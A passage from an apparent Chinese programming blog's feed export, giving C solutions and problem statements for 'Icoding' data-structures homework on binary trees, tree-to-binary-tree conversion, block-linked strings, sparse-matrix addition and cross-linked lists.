最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">BiTNode* nearest_ancestor(BiTree root, BiTNode* p, BiTNode* q)</span><br><span class="line">&#123;</span><br><span class="line">    Stack *pl, *ql;</span><br><span class="line">    pl &#x3D; malloc(sizeof(Stack));</span><br><span class="line">    ql &#x3D; malloc(sizeof(Stack));</span><br><span class="line">    init_stack(pl);</span><br><span class="line">    init_stack(ql);</span><br><span class="line">    if (path(root, p, pl) &#x3D;&#x3D; false || path(root, q, ql) &#x3D;&#x3D; false)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    ElemType temp;</span><br><span class="line">    for (int i &#x3D; 0; i &lt;&#x3D; pl-&gt;top &amp;&amp; i &lt; ql-&gt;top; i++) &#123;</span><br><span class="line">        if (pl-&gt;elem[i] !&#x3D; ql-&gt;elem[i])</span><br><span class="line">            break;</span><br><span class="line">        else</span><br><span class="line">            temp &#x3D; pl-&gt;elem[i];</span><br><span class="line">    &#125;</span><br><span class="line">    return temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T4"><a href="#T4" class="headerlink" title="T4"></a>T4</h1><p>树转二叉树<br>使用队列，编写transfrom函数，将普通树转换成对应的二叉树。二叉树的相关定义如下：</p><blockquote><p>typedef int DataType;</p><p>typedef struct Node{<br>    DataType data;<br>    struct Node* left;<br>    struct Node* right;<br>}BiTNode, *BiTree;</p></blockquote><p>普通树节点的定义如下：</p><blockquote><p>#define MAX_CHILDREN_NUM 5<br>struct _CSNode<br>{<br>    DataType data;<br>    struct _CSNode *children[MAX_CHILDREN_NUM];<br>};<br>typedef struct _CSNode CSNode;</p></blockquote><p>其中，子树的根节点的指针存放在children数组的前k个元素中，即如果children[i]的值为NULL，而children[i-1]不为NULL，则表明该结点只有i棵子树，子树根结点分别保存在children[0]至children[i-1]中。<br>队列相关定义及操作如下：</p><blockquote><p>struct __Queue<br>{<br>    int i, j; //指向数组内元素的游标<br>    void **array;<br>};<br>typedef struct __Queue Queue;</p><p>Queue* create_queue(); //创建队列<br>bool is_empty_queue(Queue <em>tree); //队为空返回true,不为空时返回false<br>void</em> del_queue(Queue *tree); //结点指针出队<br>void add_queue(Queue *tree, void *node); //结点指针入队<br>void free_queue(Queue *tree); //释放队列</p></blockquote><p>transform函数定义如下：</p><blockquote><p>BiTNode* transform(CSNode *root);</p></blockquote><p>其中 root 为普通树的根结点，函数返回该树对应二叉树的根结点。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 17:57:54</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">BiTNode* transform(CSNode* root)</span><br><span class="line">&#123;</span><br><span class="line">    if (root &#x3D;&#x3D; NULL)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    BiTree broot &#x3D; (BiTree)malloc(sizeof(struct Node));</span><br><span class="line">    broot-&gt;data &#x3D; root-&gt;data;</span><br><span class="line">    broot-&gt;left &#x3D; broot-&gt;right &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    Queue* queue &#x3D; create_queue();</span><br><span class="line">    Queue* bqueue &#x3D; create_queue();</span><br><span class="line">    add_queue(queue, root);</span><br><span class="line">    add_queue(bqueue, broot);</span><br><span class="line">    while (!is_empty_queue(queue)) &#123;</span><br><span class="line">        CSNode* node &#x3D; del_queue(queue);</span><br><span class="line">        BiTree bTreeNode &#x3D; del_queue(bqueue);</span><br><span class="line">        int i;</span><br><span class="line">        BiTree former &#x3D; NULL;</span><br><span class="line">        for (i &#x3D; 0; i &lt; MAX_CHILDREN_NUM; i++) &#123;</span><br><span class="line">            if (node-&gt;children[i]) &#123;</span><br><span class="line">                BiTree bnode &#x3D; (BiTree)malloc(sizeof(struct Node));</span><br><span class="line">                bnode-&gt;left &#x3D; bnode-&gt;right &#x3D; NULL;</span><br><span class="line">                bnode-&gt;data &#x3D; node-&gt;children[i]-&gt;data;</span><br><span class="line">                if (i &#x3D;&#x3D; 0)</span><br><span class="line">                    bTreeNode-&gt;left &#x3D; bnode;</span><br><span class="line">                else</span><br><span class="line">                    former-&gt;right &#x3D; bnode;</span><br><span class="line">                former &#x3D; bnode;</span><br><span class="line"></span><br><span class="line">                add_queue(queue, node-&gt;children[i]);</span><br><span class="line">                add_queue(bqueue, bnode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    free(queue-&gt;array);</span><br><span class="line">    free(queue);</span><br><span class="line">    free(bqueue-&gt;array);</span><br><span class="line">    free(bqueue);</span><br><span class="line">    return broot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 树 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第四次作业解析-块链串/数组</title>
      <link href="/post/716e4956.html"/>
      <url>/post/716e4956.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><ol><li>块链串</li></ol><p>块链串定义如下：</p><blockquote><p>#define BLOCK_SIZE 4    // 可由用户定义的块大小<br>#define BLS_BLANK ‘#’   // 用于空白处的补齐字符</p><p>typedef struct _block {<br>    char ch[BLOCK_SIZE];    //块的数据域<br>    struct _block *next;    //块的指针域<br>} Block;</p><p>typedef struct {<br>    Block *head;        // 串的头指针<br>    Block *tail;        // 串的尾指针<br>    int len;            // 串的当前长度<br>} BLString;</p><p>//字符串初始化函数：<br>void blstr_init(BLString *T) {<br>    T-&gt;len = 0;<br>    T-&gt;head = NULL;<br>    T-&gt;tail = NULL;<br>}</p></blockquote><p>这些定义已包含在头文件 dsstring.h 中，请实现块链串的子串查找操作：</p><blockquote><p>bool blstr_substr(BLString src, int pos, int len, BLString *sub);<br>src为要查找的字符串<br>pos为子串开始的下标<br>len为子串的长度<br>sub在函数调用运行前指向一个已经初始化好的空串，在函数返回时，sub指向串src从第pos个字符起长度为len的子串<br>函数查找成功返回true，参数不正确返回 false </p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-04-19, Sun, 16:05:30</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;dsstring.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool blstr_substr(BLString src, int pos, int len, BLString* sub)</span><br><span class="line">&#123;</span><br><span class="line">    if (pos &lt; 0 || pos &gt;&#x3D; src.len || len &lt; 1)</span><br><span class="line">        return false;</span><br><span class="line">    Block *p &#x3D; (sub-&gt;head &#x3D; (Block*)malloc(sizeof(Block))), *q &#x3D; src.head;</span><br><span class="line">    int i &#x3D; 0, j &#x3D; 0, k &#x3D; 0;</span><br><span class="line">    p-&gt;next &#x3D; NULL;</span><br><span class="line">    while (k &lt;&#x3D; pos + len - 1 &amp;&amp; q &amp;&amp; q-&gt;ch[i] !&#x3D; BLS_BLANK) &#123;</span><br><span class="line">        if (k &lt; pos) &#123;</span><br><span class="line">            if (i &lt; BLOCK_SIZE - 1)</span><br><span class="line">                i++;</span><br><span class="line">            else &#123;</span><br><span class="line">                q &#x3D; q-&gt;next;</span><br><span class="line">                i &#x3D; 0;</span><br><span class="line">            &#125;</span><br><span class="line">            k++;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            p-&gt;ch[j] &#x3D; q-&gt;ch[i];</span><br><span class="line">            if (i &lt; BLOCK_SIZE - 1)</span><br><span class="line">                i++;</span><br><span class="line">            else &#123;</span><br><span class="line">                q &#x3D; q-&gt;next;</span><br><span class="line">                i &#x3D; 0;</span><br><span class="line">            &#125;</span><br><span class="line">            if (j &lt; BLOCK_SIZE - 1)</span><br><span class="line">                j++;</span><br><span class="line">            else &#123;</span><br><span class="line">                p-&gt;next &#x3D; (Block*)malloc(sizeof(Block));</span><br><span class="line">                p &#x3D; p-&gt;next;</span><br><span class="line">                p-&gt;next &#x3D; NULL;</span><br><span class="line">                j &#x3D; 0;</span><br><span class="line">            &#125;</span><br><span class="line">            k++;</span><br><span class="line">            sub-&gt;len++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (j) &#123;</span><br><span class="line">        sub-&gt;tail &#x3D; p;</span><br><span class="line">        while (j &lt; BLOCK_SIZE)</span><br><span class="line">            p-&gt;ch[j++] &#x3D; BLS_BLANK;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        for (sub-&gt;tail &#x3D; sub-&gt;head; sub-&gt;tail-&gt;next !&#x3D; p; sub-&gt;tail &#x3D; sub-&gt;tail-&gt;next)</span><br><span class="line">            ;</span><br><span class="line">        sub-&gt;tail-&gt;next &#x3D; NULL;</span><br><span class="line">        free(p);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><ol><li>矩阵加法<br>实现三元组表示的两个稀疏矩阵的加法。相关定义如下：<blockquote><p>#define MAXSIZE 100       //假设非零元个数的最大值为100<br>typedef struct {</p><pre><code>int i,j;   //非零元的行下标和列下标，i 和 j 从 1 开始计数，与数学中矩阵元素的编号一致ElemType e;    //非零元的值</code></pre><p>}Triple;</p><p>typedef struct {</p><pre><code>Triple data[MAXSIZE];     // 非零元三元组表int    m, n, len;     // 矩阵的行数、列数和非零元个数</code></pre><p>}TSMatrix;</p></blockquote></li></ol><p>在三元组中，i 和 j 从 1 开始计数，与数学中矩阵元素的编号一致<br>矩阵加法函数的原型为：</p><blockquote><p>bool add_matrix(const TSMatrix *pM, const TSMatrix *pN, TSMatrix *pQ);</p></blockquote><p>pM, pN, pQ 分别指向三个矩阵，当 pM 和 pN 两个矩阵不可加时，函数返回 false，否则函数返回 true，且 pQ 指向两个矩阵的和。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-04-19, Sun, 16:10:16</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;tsmatrix.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool add_matrix(const TSMatrix* pM, const TSMatrix* pN, TSMatrix* pQ)</span><br><span class="line">&#123;</span><br><span class="line">    TSMatrix *M &#x3D; pM, *N &#x3D; pN, *Q &#x3D; pQ;</span><br><span class="line">    if (M-&gt;m !&#x3D; N-&gt;m || M-&gt;n !&#x3D; N-&gt;n) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    int i &#x3D; 0, j &#x3D; 0, k &#x3D; 0;</span><br><span class="line">    Q-&gt;m &#x3D; M-&gt;m, Q-&gt;n &#x3D; M-&gt;n, Q-&gt;len &#x3D; 0;</span><br><span class="line">    while (i &lt; M-&gt;len &amp;&amp; j &lt; N-&gt;len) &#123;</span><br><span class="line">        if (M-&gt;data[i].i &lt; N-&gt;data[j].i || (M-&gt;data[i].i &#x3D;&#x3D; N-&gt;data[j].i &amp;&amp; M-&gt;data[i].j &lt; N-&gt;data[j].j)) &#123;</span><br><span class="line">            Q-&gt;data[k].i &#x3D; M-&gt;data[i].i;</span><br><span class="line">            Q-&gt;data[k].j &#x3D; M-&gt;data[i].j;</span><br><span class="line">            Q-&gt;data[k].e &#x3D; M-&gt;data[i].e;</span><br><span class="line">            Q-&gt;len++, k++, i++;</span><br><span class="line">        &#125; else if (M-&gt;data[i].i &#x3D;&#x3D; N-&gt;data[j].i &amp;&amp; M-&gt;data[i].j &#x3D;&#x3D; N-&gt;data[j].j) &#123;</span><br><span class="line">            if (M-&gt;data[i].e + N-&gt;data[j].e) &#123;</span><br><span class="line">                Q-&gt;data[k].i &#x3D; M-&gt;data[i].i;</span><br><span class="line">                Q-&gt;data[k].j &#x3D; M-&gt;data[i].j;</span><br><span class="line">                Q-&gt;data[k].e &#x3D; M-&gt;data[i].e + N-&gt;data[j].e;</span><br><span class="line">                k++, Q-&gt;len++;</span><br><span class="line">            &#125;</span><br><span class="line">            i++, j++;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Q-&gt;len++;</span><br><span class="line">            Q-&gt;data[k].i &#x3D; N-&gt;data[i].i;</span><br><span class="line">            Q-&gt;data[k].j &#x3D; N-&gt;data[i].j;</span><br><span class="line">            Q-&gt;data[k] &#x3D; N-&gt;data[j];</span><br><span class="line">            k++, j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while (i &lt; M-&gt;len) &#123;</span><br><span class="line">        Q-&gt;len++;</span><br><span class="line">        Q-&gt;data[k] &#x3D; M-&gt;data[i];</span><br><span class="line">        k++, i++;</span><br><span class="line">    &#125;</span><br><span class="line">    while (j &lt; N-&gt;len) &#123;</span><br><span class="line">        Q-&gt;len++;</span><br><span class="line">        Q-&gt;data[k] &#x3D; N-&gt;data[j];</span><br><span class="line">        k++, j++;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><ol><li>十字链表<br>十字链表相关定义如下：<blockquote><p>typedef int ElemType;</p><p>// 非零元素结点结构<br>typedef struct OLNode<br>{</p><pre><code>int row,col;ElemType value;struct OLNode *right,*down;</code></pre><p>}OLNode,*OLink;</p><p>// 十字链表结构<br>typedef struct<br>{</p><pre><code>OLink *rowhead,*colhead;int rows,cols,nums;</code></pre><p>}CrossList, *PCrossList;</p></blockquote></li></ol><p>1）实现十字链表的初始化操作：</p><blockquote><p>int init_cross_list(PCrossList L, const ElemType *A, int m, int n);</p></blockquote><p>其中 L 指向 CrossList 结构，且各成员已被初始化为0；<br>A 为 ElemType 类型数组中第一个元素的地址，元素的个数为 m×n 个，按行优先存储（即A[0] 为十字链表第1行第1列的元素；<br>A[1] 为第1行第2列的元素，A[n] 为第2行第1列的元素，A[n+1] 为第2行第2个元素）；<br>m 表示十字链表的行数，n 表示十字链表的列数。<br>init_cross_list 函数将 ElemType 数组中非0元素保存到十字链表中，函数返回非 0 元素的个数。</p><p>2）实现十字链表的删除操作：</p><blockquote><p>int del_cross_list(PCrossList L, ElemType k);</p></blockquote><p>其中 L 指向 要处理的 CrossList 结构，k 为要删除的元素；<br>del_cross_list 函数删除十字链表中所有值为 k 的结点，并返回删除结点的个数。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-04-19, Sun, 16:15:09</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;crosslist.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int init_cross_list(PCrossList L, const ElemType* A, int m, int n)</span><br><span class="line">&#123;</span><br><span class="line">    OLNode *p, *q;</span><br><span class="line">    int i &#x3D; 0, j &#x3D; 0, k &#x3D; 0;</span><br><span class="line">    L-&gt;rows &#x3D; m;</span><br><span class="line">    L-&gt;cols &#x3D; n;</span><br><span class="line">    L-&gt;nums &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    L-&gt;rowhead &#x3D; (OLink*)malloc((m + 1) * sizeof(OLNode));</span><br><span class="line">    for (j &#x3D; 0; j &lt;&#x3D; m; ++j) &#123;</span><br><span class="line">        L-&gt;rowhead[j] &#x3D; NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;colhead &#x3D; (OLink*)malloc((n + 1) * sizeof(OLNode));</span><br><span class="line">    for (j &#x3D; 0; j &lt;&#x3D; n; ++j) &#123;</span><br><span class="line">        L-&gt;colhead[j] &#x3D; NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    for (k &#x3D; 1; k &lt;&#x3D; m * n; ++k) &#123;</span><br><span class="line">        if (A[k - 1] !&#x3D; 0) &#123;</span><br><span class="line">            p &#x3D; (OLink)malloc(sizeof(OLNode));</span><br><span class="line">            p-&gt;row &#x3D; ((k - 1) &#x2F; n);</span><br><span class="line">            p-&gt;col &#x3D; k - (p-&gt;row * n) - 1;</span><br><span class="line">            p-&gt;value &#x3D; A[k - 1];</span><br><span class="line">            p-&gt;right &#x3D; NULL;</span><br><span class="line">            p-&gt;down &#x3D; NULL;</span><br><span class="line">            L-&gt;nums++;</span><br><span class="line">            i &#x3D; p-&gt;row;</span><br><span class="line">            if (L-&gt;rowhead[i] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">                L-&gt;rowhead[i] &#x3D; p;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                for (q &#x3D; L-&gt;rowhead[i]; q-&gt;right &amp;&amp; q-&gt;right-&gt;col &lt; p-&gt;col; q &#x3D; q-&gt;right)</span><br><span class="line">                    ;</span><br><span class="line">                p-&gt;right &#x3D; q-&gt;right;</span><br><span class="line">                q-&gt;right &#x3D; p;</span><br><span class="line">            &#125;</span><br><span class="line">            i &#x3D; p-&gt;col;</span><br><span class="line">            if (L-&gt;colhead[i] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">                L-&gt;colhead[i] &#x3D; p;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                for (q &#x3D; L-&gt;colhead[i]; q-&gt;down &amp;&amp; q-&gt;down-&gt;row &lt; p-&gt;row; q &#x3D; q-&gt;down)</span><br><span class="line">                    ;</span><br><span class="line">                p-&gt;down &#x3D; q-&gt;down;</span><br><span class="line">                q-&gt;down &#x3D; p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return L-&gt;nums;</span><br><span class="line">&#125;</span><br><span class="line">int del_cross_list(PCrossList L, ElemType k)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; 0, t &#x3D; 0;</span><br><span class="line">    OLink temp;</span><br><span class="line">    OLink p &#x3D; NULL;</span><br><span class="line">    OLink templeft &#x3D; NULL;</span><br><span class="line">    OLink tempup &#x3D; NULL;</span><br><span class="line">    for (i &#x3D; 0; i &lt; L-&gt;rows; i++) &#123;</span><br><span class="line">        if (L-&gt;rowhead[i] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        for (p &#x3D; L-&gt;rowhead[i], temp &#x3D; p-&gt;right; p !&#x3D; NULL; p &#x3D; temp) &#123;</span><br><span class="line">            temp &#x3D; p-&gt;right;</span><br><span class="line">            if (p-&gt;value &#x3D;&#x3D; k) &#123;</span><br><span class="line">                for (templeft &#x3D; L-&gt;rowhead[i]; templeft-&gt;right &amp;&amp; templeft-&gt;right-&gt;col &lt; p-&gt;col; templeft &#x3D; templeft-&gt;right)</span><br><span class="line">                    ;</span><br><span class="line">                for (tempup &#x3D; L-&gt;colhead[p-&gt;col]; tempup-&gt;down !&#x3D; NULL &amp;&amp; tempup-&gt;down-&gt;row &lt; p-&gt;row; tempup &#x3D; tempup-&gt;down)</span><br><span class="line">                    ;</span><br><span class="line">                if (templeft &#x3D;&#x3D; p) &#123;</span><br><span class="line">                    if (tempup &#x3D;&#x3D; p) &#123;</span><br><span class="line">                        L-&gt;rowhead[i] &#x3D; p-&gt;right;</span><br><span class="line">                        L-&gt;colhead[p-&gt;col] &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        L-&gt;rowhead[i] &#x3D; p-&gt;right;</span><br><span class="line">                        tempup-&gt;down &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (tempup &#x3D;&#x3D; p) &#123;</span><br><span class="line">                        templeft-&gt;right &#x3D; p-&gt;right;</span><br><span class="line">                        L-&gt;colhead[p-&gt;col] &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        templeft-&gt;right &#x3D; p-&gt;right;</span><br><span class="line">                        tempup-&gt;down &#x3D; p-&gt;down;</span><br><span class="line">                        free(p);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                t++;</span><br><span class="line">                L-&gt;nums--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 块链串 </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第三次作业解析-字符串</title>
      <link href="/post/46728.html"/>
      <url>/post/46728.html</url>
      
